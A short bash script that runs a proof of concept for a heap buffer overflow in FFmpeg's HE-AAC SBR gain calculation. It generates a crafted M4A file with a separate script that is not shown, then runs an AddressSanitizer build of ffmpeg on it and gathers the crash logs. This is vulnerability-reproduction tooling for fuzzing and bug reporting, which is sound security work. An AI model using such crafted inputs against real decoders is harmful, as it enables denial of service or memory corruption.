#!/bin/bash
# PoC runner for VULN 002: Heap Buffer Overflow in sbr_gain_calc
# via Unchecked m[1] > 48 in aacsbr_fixed.c / aacsbr_template.c

set -euo pipefail
cd "$(dirname "$0")"

BIN=/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg

if [ ! -f "$BIN" ]; then
    echo "ERROR: ffmpeg binary not found at $BIN" >&2
    exit 1
fi

echo "[*] Generating crafted HE-AAC M4A file..."
python3 vuln_002_gen.py

if [ ! -f "vuln_002_input.m4a" ]; then
    echo "ERROR: vuln_002_input.m4a not generated" >&2
    exit 1
fi

echo "[*] Running ffmpeg with ASAN..."
ASAN_OPTIONS="abort_on_error=0:log_path=./asan_002.log:exitcode=0" \
    "$BIN" -i vuln_002_input.m4a -f null - > vuln_002_result.txt 2>&1 || true

# Append any ASAN logs
for logfile in asan_002.log.*; do
    if [ -f "$logfile" ]; then
        echo "=== ASAN log: $logfile ===" >> vuln_002_result.txt
        cat "$logfile" >> vuln_002_result.txt
    fi
done

echo "[*] Result:"
cat vuln_002_result.txt
echo
echo "[*] Done. Check vuln_002_result.txt for details."
